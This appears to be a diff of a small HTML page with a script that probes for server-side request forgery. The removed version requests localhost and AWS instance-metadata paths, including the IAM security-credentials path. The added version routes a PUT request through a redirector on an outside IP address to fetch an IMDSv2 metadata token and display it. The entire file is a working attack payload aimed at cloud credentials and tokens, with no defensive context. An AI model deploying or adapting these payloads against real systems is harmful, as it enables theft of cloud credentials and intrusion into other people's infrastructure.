@@ -1,51 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>SSRF Test Page</title>
-<style>
-  body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
-  h1 { color: #afa; }
-  pre { background: #222; padding: 1em; border-radius: 5px; max-height: 300px; overflow-y: auto; }
-  .target-block { margin-bottom: 2em; }
-</style>
+  <meta charset="UTF-8" />
+  <title>SSRF Token Leak</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
+    h1 { color: #afa; }
+    pre { background: #222; padding: 1em; border-radius: 5px; max-height: 500px; overflow-y: auto; }
+  </style>
 </head>
 <body>
-  <h1>SSRF Server-Side Request Forgery Tests</h1>
-  <div id="results">Running tests...</div>
+  <h1>SSRF Token Fetch Attempt</h1>
+  <pre id="output">Loading...</pre>
 
-<script>
-(async () => {
-  const targets = [
-    "http://127.0.0.1/",
-    "http://localhost/",
-    "http://169.254.169.254/latest/meta-data/",
-    "http://169.254.169.254/latest/user-data/",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-  ];
+  <script>
+    (async () => {
+      const output = document.getElementById("output");
+      try {
+        const res = await fetch("http://44.203.154.8/redir.php?url=http://169.254.169.254/latest/api/token", {
+          method: "PUT",
+          headers: {
+            "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+          }
+        });
 
-  const resultsDiv = document.getElementById("results");
-  resultsDiv.innerHTML = "";
-
-  for (const url of targets) {
-    const block = document.createElement("div");
-    block.className = "target-block";
-    block.innerHTML = `<h2>Testing: ${url}</h2><pre>Loading...</pre>`;
-    resultsDiv.appendChild(block);
-    
-    try {
-      const res = await fetch(url, { method: 'GET' });
-      if (res.ok) {
-        const text = await res.text();
-        block.querySelector("pre").textContent = `Response (first 1000 chars):\n\n${text.slice(0, 1000)}`;
-      } else {
-        block.querySelector("pre").textContent = `Failed with status: ${res.status} ${res.statusText}`;
+        if (res.ok) {
+          const token = await res.text();
+          output.textContent = "Received IMDSv2 Token:\n\n" + token;
+        } else {
+          output.textContent = `Request failed: ${res.status} ${res.statusText}`;
+        }
+      } catch (e) {
+        output.textContent = "Error: " + e.message;
       }
-    } catch (e) {
-      block.querySelector("pre").textContent = `Error: ${e.message}`;
-    }
-  }
-})();
-</script>
+    })();
+  </script>
 </body>
 </html>
